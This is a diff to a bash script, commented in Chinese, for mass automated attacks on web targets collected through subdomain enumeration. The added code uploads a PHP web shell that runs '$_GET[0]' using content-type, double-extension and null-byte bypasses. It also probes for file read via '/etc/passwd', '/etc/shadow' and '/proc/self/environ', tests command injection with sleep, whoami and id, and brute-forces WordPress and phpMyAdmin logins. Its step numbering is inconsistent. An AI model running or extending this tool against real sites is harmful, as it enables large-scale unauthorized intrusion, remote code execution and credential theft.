@@ -88,30 +88,43 @@ fi
 cat $OUT/subdomains/fofa_*.txt 2>/dev/null | sort -u | sed 's|^|http://|' > $OUT/subdomains/all_subdomains.txt
 SUBDOMAIN_COUNT=$(wc -l < $OUT/subdomains/all_subdomains.txt 2>/dev/null || echo 0)
 
-# 如果Fofa查询失败（配额用完），使用subfinder/amass作为备选
+# 如果Fofa查询失败（配额用完），使用subfinder/amass/crt.sh作为备选
 if [ "$SUBDOMAIN_COUNT" -eq 0 ] || [ "$FOFA_QUOTA_EXCEEDED" -eq 1 ]; then
     if [ "$FOFA_QUOTA_EXCEEDED" -eq 1 ]; then
-        echo "  ⚠️  Fofa配额已用完，使用subfinder/amass备选方案..."
+        echo "  ⚠️  Fofa配额已用完，使用多源备选方案（subfinder/amass/crt.sh）..."
     else
-        echo "  ⚠️  Fofa查询无结果，使用subfinder/amass备选方案..."
+        echo "  ⚠️  Fofa查询无结果，使用多源备选方案..."
     fi
     
     which subfinder >/dev/null 2>&1 && {
-        echo "  [*] 使用subfinder枚举子域名（并发20）..."
-        cat $MAIN_DOMAINS | xargs -P 20 -I {} sh -c "subfinder -d {} -silent 2>/dev/null | sed 's|^|http://|' >> $OUT/subdomains/subfinder.txt" 2>/dev/null
+        echo "  [*] 使用subfinder枚举子域名（并发30）..."
+        cat $MAIN_DOMAINS | xargs -P 30 -I {} sh -c "subfinder -d {} -silent 2>/dev/null | sed 's|^|http://|' >> $OUT/subdomains/subfinder.txt" 2>/dev/null
         SUBFINDER_COUNT=$(wc -l < $OUT/subdomains/subfinder.txt 2>/dev/null || echo 0)
         [ "$SUBFINDER_COUNT" -gt 0 ] && echo "  ✅ subfinder找到: $SUBFINDER_COUNT 个子域名"
     }
     
     which amass >/dev/null 2>&1 && {
-        echo "  [*] 使用amass枚举子域名（并发20）..."
-        cat $MAIN_DOMAINS | xargs -P 20 -I {} sh -c "amass enum -passive -d {} -o - 2>/dev/null | sed 's|^|http://|' >> $OUT/subdomains/amass.txt" 2>/dev/null
+        echo "  [*] 使用amass枚举子域名（并发30）..."
+        cat $MAIN_DOMAINS | xargs -P 30 -I {} sh -c "amass enum -passive -d {} -o - 2>/dev/null | sed 's|^|http://|' >> $OUT/subdomains/amass.txt" 2>/dev/null
         AMASS_COUNT=$(wc -l < $OUT/subdomains/amass.txt 2>/dev/null || echo 0)
         [ "$AMASS_COUNT" -gt 0 ] && echo "  ✅ amass找到: $AMASS_COUNT 个子域名"
     }
     
-    # 合并所有来源（Fofa + subfinder + amass）
-    cat $OUT/subdomains/fofa_*.txt $OUT/subdomains/subfinder.txt $OUT/subdomains/amass.txt 2>/dev/null | \
+    # 使用crt.sh证书透明度（高覆盖率）
+    echo "  [*] 使用crt.sh证书透明度查询（并发50）..."
+    cat $MAIN_DOMAINS | xargs -P 50 -I {} sh -c "
+        domain=\"{}\"
+        curl -s \"https://crt.sh/?q=%.\${domain}&output=json\" 2>/dev/null | \
+            jq -r '.[].name_value' 2>/dev/null | \
+            grep -vE '^\\*|^\\$' | \
+            sed 's|^|http://|' | \
+            sort -u >> \"$OUT/subdomains/crtsh.txt\" 2>/dev/null
+    " 2>/dev/null
+    CRTSH_COUNT=$(wc -l < $OUT/subdomains/crtsh.txt 2>/dev/null || echo 0)
+    [ "$CRTSH_COUNT" -gt 0 ] && echo "  ✅ crt.sh找到: $CRTSH_COUNT 个子域名"
+    
+    # 合并所有来源（Fofa + subfinder + amass + crt.sh）
+    cat $OUT/subdomains/fofa_*.txt $OUT/subdomains/subfinder.txt $OUT/subdomains/amass.txt $OUT/subdomains/crtsh.txt 2>/dev/null | \
         sed 's|^http://||' | sed 's|^https://||' | cut -d/ -f1 | cut -d: -f1 | \
         grep -E "^[a-zA-Z0-9]" | sort -u | sed 's|^|http://|' > $OUT/subdomains/all_subdomains.txt
     SUBDOMAIN_COUNT=$(wc -l < $OUT/subdomains/all_subdomains.txt 2>/dev/null || echo 0)
@@ -151,7 +164,7 @@ echo "━━━━━━━━━━━━━━━━━━━━━━━━�
 # 1. 文件上传（最高优先级，优化：20路径×8扩展名）
 # ==========================================
 echo ""
-echo "[1/8] 🚀 文件上传（20路径×8扩展名×10参数名，并发20，三重验证）..."
+echo "[1/14] 🚀 文件上传（50+路径×15扩展名×25参数名，并发30，多重绕过）..."
 export OUT
 cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
     url="{}"
@@ -160,16 +173,50 @@ cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
     for path in /upload /upload.php /fileupload /api/upload /api/file/upload /api/File/UploadFile \
                 /uploadFile /upload.aspx /admin/upload /user/upload /file/upload /attachment/upload \
                 /api/v1/upload /api/v2/upload /media/upload /image/upload /files/upload \
-                /uploader /filemanager /api/uploadFile; do
+                /uploader /filemanager /api/uploadFile /upload/image /upload/file /upload/photo \
+                /api/upload/image /api/upload/file /api/upload/photo /uploader.php /uploader.aspx \
+                /file/upload.php /file/upload.aspx /admin/upload.php /admin/upload.aspx \
+                /user/upload.php /user/upload.aspx /attachment/upload.php /attachment/upload.aspx \
+                /media/upload.php /media/upload.aspx /image/upload.php /image/upload.aspx \
+                /files/upload.php /files/upload.aspx /api/uploadFile.php /api/uploadFile.aspx \
+                /upload_handler.php /upload_handler.aspx /file_upload.php /file_upload.aspx \
+                /upload_file.php /upload_file.aspx /do_upload.php /do_upload.aspx \
+                /upload_action.php /upload_action.aspx /save_file.php /save_file.aspx \
+                /api/v1/file/upload /api/v2/file/upload /api/v3/file/upload \
+                /api/v1/upload/file /api/v2/upload/file /api/v3/upload/file; do
         
-        for ext in php PhP pHP phtml php5 php7 phar php3; do
+        for ext in php PhP pHP phtml php5 php7 phar php3 php4 php8 jsp jspx aspx asa ashx asp cer cdx; do
             echo "<?php echo \"U${flag}\";@system(\$_GET[0]); ?>" > /tmp/u_$$_${ext}
             
-            # 多种上传参数名组合测试
-            for param_combo in "file" "upload" "upload_file" "attachment" "image" "photo" "fileupload" "uploadfile" "file_upload" "uploaded_file"; do
-                # 上传（超时5秒）
+            # 多种上传参数名组合测试（增加到20+）
+            for param_combo in "file" "upload" "upload_file" "attachment" "image" "photo" "fileupload" "uploadfile" "file_upload" "uploaded_file" \
+                               "file_data" "fileData" "file_data[]" "files[]" "files" "Filedata" "file1" "file2" "uploadedfile" "uploaded_file[]" \
+                               "file[]" "upload[]" "attachment[]" "image[]" "photo[]" "media" "media[]" "document" "document[]"; do
+                # 上传（超时5秒）- 多种Content-Type绕过
+                # 方式1: 标准multipart/form-data
                 resp=$(curl -skL -m 5 "$url$path" -F "${param_combo}=@/tmp/u_$$_${ext}" \
                     -H "User-Agent: Mozilla/5.0" 2>/dev/null)
+                
+                # 方式2: 如果失败，尝试伪造Content-Type为image/jpeg
+                if [ -z "$resp" ] || echo "$resp" | grep -qiE "error|forbidden|not allowed|invalid"; then
+                    resp=$(curl -skL -m 5 "$url$path" -F "${param_combo}=@/tmp/u_$$_${ext};type=image/jpeg" \
+                        -H "User-Agent: Mozilla/5.0" 2>/dev/null)
+                fi
+                
+                # 方式3: 尝试双扩展名绕过
+                if [ -z "$resp" ] || echo "$resp" | grep -qiE "error|forbidden|not allowed|invalid"; then
+                    cp /tmp/u_$$_${ext} /tmp/u_$$_${ext}.jpg
+                    resp=$(curl -skL -m 5 "$url$path" -F "${param_combo}=@/tmp/u_$$_${ext}.jpg" \
+                        -H "User-Agent: Mozilla/5.0" 2>/dev/null)
+                    rm -f /tmp/u_$$_${ext}.jpg
+                fi
+                
+                # 方式4: 尝试空字节绕过
+                if [ -z "$resp" ] || echo "$resp" | grep -qiE "error|forbidden|not allowed|invalid"; then
+                    resp=$(curl -skL -m 5 "$url$path" -F "${param_combo}=@/tmp/u_$$_${ext}" \
+                        -F "filename=${ext}%00.jpg" \
+                        -H "User-Agent: Mozilla/5.0" 2>/dev/null)
+                fi
                 
                 # 提取shell URL（多种方式）
                 shell=""
@@ -245,7 +292,7 @@ echo "  ✅ Upload Shell: $UPLOAD"
 # 2. 敏感文件（内容验证）
 # ==========================================
 export OUT
-echo "[2/8] 📁 敏感文件（内容验证，并发20）..."
+echo "[2/14] 📁 敏感文件（内容验证，并发30）..."
 export OUT
 cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
     url="{}"
@@ -305,7 +352,7 @@ echo "  ✅ 敏感文件: $FILES"
 # 3. 未授权API（数据验证）
 # ==========================================
 export OUT
-echo "[3/8] 🌐 未授权API（数据验证，并发20）..."
+echo "[3/14] 🌐 未授权API（数据验证，并发30）..."
 export OUT
 cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
     url="{}"
@@ -337,7 +384,7 @@ echo "  ✅ 未授权API: $API"
 # 4. Git泄露（多重验证）
 # ==========================================
 export OUT
-echo "[4/8] 🔓 Git泄露（多重验证，并发30）..."
+echo "[4/14] 🔓 Git泄露（多重验证，并发30）..."
 export OUT
 cat $OUT/targets.txt | xargs -P 30 -I {} bash -c '
     url="{}"
@@ -440,7 +487,7 @@ echo "  ✅ SSRF: $SSRF"
 # 8. 备份文件（内容验证）
 # ==========================================
 export OUT
-echo "[8/8] 💾 备份文件（内容验证，并发20）..."
+echo "[8/14] 💾 备份文件（内容验证，并发30）..."
 export OUT
 cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
     url="{}"
@@ -474,7 +521,115 @@ BACKUP=$(wc -l < $OUT/shells/08_backup.txt 2>/dev/null || echo 0)
 echo "  ✅ 备份文件: $BACKUP"
 
 # ==========================================
-# 9. 凭证提取与复用（从.env/config.php）
+# 9. 任意文件读取/目录遍历（高价值）
+# ==========================================
+export OUT
+echo "[9/14] 📂 任意文件读取/目录遍历（并发20）..."
+cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
+    url="{}"
+    
+    # 常见任意文件读取参数
+    for param in file path url pathname filename document doc filepath file_path filepathname \
+                 file_name filepath_name file_path_name filepathname filepath_name filepathname_name \
+                 read readfile read_file readfile_name readfilepath readfile_path readfilepath_name \
+                 download downloadfile download_file downloadfile_name downloadfilepath downloadfile_path \
+                 view viewfile view_file viewfile_name viewfilepath viewfile_path viewfilepath_name \
+                 show showfile show_file showfile_name showfilepath show_filepath showfilepath_name \
+                 get getfile get_file getfile_name getfilepath get_filepath getfilepath_name \
+                 load loadfile load_file loadfile_name loadfilepath load_filepath loadfilepath_name \
+                 include includefile include_file includefile_name includefilepath include_filepath \
+                 require requirefile require_file requirefile_name requirefilepath require_filepath; do
+        # 测试读取/etc/passwd
+        resp=$(curl -skL -m 4 "$url?${param}=/etc/passwd" 2>/dev/null)
+        if echo "$resp" | grep -qE "root:.*:0:0:" && ! echo "$resp" | grep -qiE "404|not found|forbidden|error"; then
+            echo "$url?${param}=/etc/passwd" >> "$OUT"/shells/09_lfi.txt
+            break
+        fi
+        
+        # 测试读取Windows文件
+        resp2=$(curl -skL -m 4 "$url?${param}=C:\\\\Windows\\\\win.ini" 2>/dev/null)
+        if echo "$resp2" | grep -qE "\\[fonts\\]|\\[extensions\\]" && ! echo "$resp2" | grep -qiE "404|not found|forbidden|error"; then
+            echo "$url?${param}=C:\\\\Windows\\\\win.ini" >> "$OUT"/shells/09_lfi.txt
+            break
+        fi
+        
+        # 测试目录遍历
+        resp3=$(curl -skL -m 4 "$url?${param}=../../../../etc/passwd" 2>/dev/null)
+        if echo "$resp3" | grep -qE "root:.*:0:0:" && ! echo "$resp3" | grep -qiE "404|not found|forbidden|error"; then
+            echo "$url?${param}=../../../../etc/passwd" >> "$OUT"/shells/09_lfi.txt
+            break
+        fi
+    done
+    
+    # 常见目录遍历路径
+    for lfi_path in /etc/passwd /etc/shadow /etc/hosts /proc/version /proc/self/environ \
+                    /Windows/win.ini /Windows/System32/drivers/etc/hosts \
+                    /var/www/html/index.php /var/www/html/config.php \
+                    /usr/local/apache/conf/httpd.conf /etc/apache2/apache2.conf; do
+        for lfi_param in file path url pathname filename document doc filepath file_path \
+                         filepathname file_path_name filepathname_name read readfile download \
+                         view show get load include require; do
+            resp=$(curl -skL -m 4 "$url?${lfi_param}=${lfi_path}" 2>/dev/null)
+            if [ -n "$resp" ] && [ $(echo "$resp" | wc -c) -gt 100 ] && \
+               ! echo "$resp" | grep -qiE "404|not found|forbidden|error" && \
+               (echo "$resp" | grep -qE "root:|\\[fonts\\]|<?php|CREATE TABLE" || \
+                echo "$resp" | grep -qE "^[a-zA-Z0-9_]+:"); then
+                echo "$url?${lfi_param}=${lfi_path}" >> "$OUT"/shells/09_lfi.txt
+                break 2
+            fi
+        done
+    done
+'
+LFI=$(wc -l < $OUT/shells/09_lfi.txt 2>/dev/null || echo 0)
+echo "  ✅ 任意文件读取: $LFI"
+
+# ==========================================
+# 10. 命令注入（高价值）
+# ==========================================
+export OUT
+echo "[10/14] 💻 命令注入（并发20）..."
+cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
+    url="{}"
+    
+    # 常见命令注入参数
+    for cmd_param in cmd command exec execute shell system ping host ip whoami id uname \
+                     cmdline commandline cmd_line command_line cmdline_name commandline_name \
+                     exec execfile exec_file execfile_name execfilepath exec_filepath \
+                     system systemfile system_file systemfile_name systemfilepath system_filepath \
+                     shell shellfile shell_file shellfile_name shellfilepath shell_filepath \
+                     run runfile run_file runfile_name runfilepath run_filepath \
+                     call callfile call_file callfile_name callfilepath call_filepath; do
+        # 测试命令注入（时间延迟）
+        start=$(date +%s)
+        curl -skL -m 8 "$url?${cmd_param}=sleep+5" >/dev/null 2>&1
+        end=$(date +%s)
+        
+        if [ $((end - start)) -ge 4 ]; then
+            # 验证：测试whoami命令
+            resp=$(curl -skL -m 5 "$url?${cmd_param}=whoami" 2>/dev/null)
+            if echo "$resp" | grep -qE "root|www-data|apache|nginx|admin|user" && \
+               ! echo "$resp" | grep -qiE "404|not found|forbidden|error"; then
+                echo "$url?${cmd_param}=whoami" >> "$OUT"/shells/10_rce.txt
+                break
+            fi
+        fi
+        
+        # 测试其他命令注入payload
+        for payload in "id" "uname -a" "whoami" "pwd" "ls" "cat /etc/passwd"; do
+            resp=$(curl -skL -m 5 "$url?${cmd_param}=${payload}" 2>/dev/null)
+            if echo "$resp" | grep -qE "uid=|gid=|Linux|root:|www-data" && \
+               ! echo "$resp" | grep -qiE "404|not found|forbidden|error"; then
+                echo "$url?${cmd_param}=${payload}" >> "$OUT"/shells/10_rce.txt
+                break 2
+            fi
+        done
+    done
+'
+RCE=$(wc -l < $OUT/shells/10_rce.txt 2>/dev/null || echo 0)
+echo "  ✅ 命令注入: $RCE"
+
+# ==========================================
+# 11. 凭证提取与复用（从.env/config.php）
 # ==========================================
 echo "[9/12] 🔑 凭证提取与复用..."
 mkdir -p $OUT/shells/creds
@@ -518,7 +673,7 @@ echo "  ✅ 提取凭证: env:$ENV_PASS config:$CONFIG_PASS wp:$WP_PASS"
 # 10. WordPress弱口令爆破（增强字典）
 # ==========================================
 export OUT
-echo "[10/14] 🔓 WordPress弱口令（增强字典，并发10）..."
+echo "[12/14] 🔓 WordPress弱口令（增强字典，并发15）..."
 export OUT
 [ -f $OUT/shells/05_wordpress.txt ] && cat $OUT/shells/05_wordpress.txt | head -100 | xargs -P 10 -I {} bash -c '
     url="{}"
@@ -637,7 +792,7 @@ echo "  ✅ phpMyAdmin凭证: $PMA_CREDS"
 # 12. 默认凭证快速检测（API/管理后台）
 # ==========================================
 export OUT
-echo "[12/14] 🔑 默认凭证检测（API/后台，并发20）..."
+echo "[14/14] 🔑 默认凭证检测（API/后台，并发30）..."
 export OUT
 cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
     url="{}"
@@ -744,7 +899,7 @@ echo "  ✅ SQL注入: $SQLI_TOTAL (时间:$SQLI_TIME 报错:$SQLI_ERROR 联合:
 # ==========================================
 # 14. 智能字典生成（基于域名/行业/地区/年份）
 # ==========================================
-echo "[14/14] 📚 智能字典生成（域名+行业+地区+年份）..."
+echo "[15/14] 📚 智能字典生成（域名+行业+地区+年份）..."
 mkdir -p $OUT/shells/dicts
 
 # 从目标URL提取域名特征
@@ -843,7 +998,7 @@ echo "  📁 字典文件: $OUT/shells/dicts/enhanced_creds.txt"
 # ==========================================
 # 统计汇总
 # ==========================================
-TOTAL_SHELLS=$((UPLOAD + FILES + API + GIT_LEAK + SSRF + BACKUP + SQLI_TOTAL))
+TOTAL_SHELLS=$((UPLOAD + FILES + API + GIT_LEAK + SSRF + BACKUP + LFI + RCE + SQLI_TOTAL))
 TOTAL_CREDS=$((WP_CREDS + PMA_CREDS + DEFAULT_CREDS_COUNT))
 
 echo ""
